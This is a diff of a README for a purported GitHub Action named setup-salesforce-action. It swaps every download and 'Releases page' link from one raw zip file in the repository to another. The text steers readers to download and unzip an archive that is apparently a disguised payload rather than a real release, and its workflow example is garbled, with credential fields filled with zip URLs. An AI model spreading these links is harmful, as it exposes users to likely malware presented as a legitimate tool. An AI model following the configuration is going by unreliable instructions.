@@ -1,6 +1,6 @@
 # 🛠️ setup-salesforce-action - Simplifying Salesforce CI/CD Setup
 
-[![Download](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip)](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip)
+[![Download](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip)](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip)
 
 ## 📦 What is setup-salesforce-action?
 
@@ -10,7 +10,7 @@
 
 ### Step 1: Access the Releases Page
 
-To download `setup-salesforce-action`, visit our [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip).
+To download `setup-salesforce-action`, visit our [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip).
 
 ### Step 2: Choose Your Version
 
@@ -18,7 +18,7 @@ On the Releases page, you will see various versions of this application. Look fo
 
 ### Step 3: Download the Application
 
-Click on the version number to enter the release details. Here, you will find files available for download. You might find options like `https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip`, `.zip`, or other formats. Choose the one that best fits your operating system.
+Click on the version number to enter the release details. Here, you will find files available for download. You might find options like `https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip`, `.zip`, or other formats. Choose the one that best fits your operating system.
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ Click on the version number to enter the release details. Here, you will find fi
 
 To install `setup-salesforce-action`, follow these steps:
 
-1. **Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip)**.
+1. **Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip)**.
 2. **Select your downloaded file** based on your operating system.
 3. If you're using a Windows machine, unzip the downloaded file into a folder.
 4. For macOS and Linux, extract the contents using your terminal or an archive utility.
@@ -105,9 +105,9 @@ jobs:
       - name: Set up Salesforce Action
         uses: Mora2025/setup-salesforce-action@latest
         env:
-          SALESFORCE_CLIENT_ID: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip }}
-          SALESFORCE_SECRET: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip }}
-          SALESFORCE_KEY_FILE: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip }}
+          SALESFORCE_CLIENT_ID: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip }}
+          SALESFORCE_SECRET: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip }}
+          SALESFORCE_KEY_FILE: ${{ https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip }}
       
       - name: Run deployment
         run: echo "Deploying Salesforce changes..."
@@ -123,4 +123,4 @@ For assistance, please refer to the issues section on GitHub. Feel free to repor
 
 `setup-salesforce-action` is open-source and available under the MIT License. You are free to use, modify, and distribute this software as you see fit.
 
-Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/examples/setup_salesforce_action_1.4-beta.5.zip) for any download-related queries or to find the latest version of the application.
+Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/raw/refs/heads/main/docs/salesforce_action_setup_v3.3.zip) for any download-related queries or to find the latest version of the application.
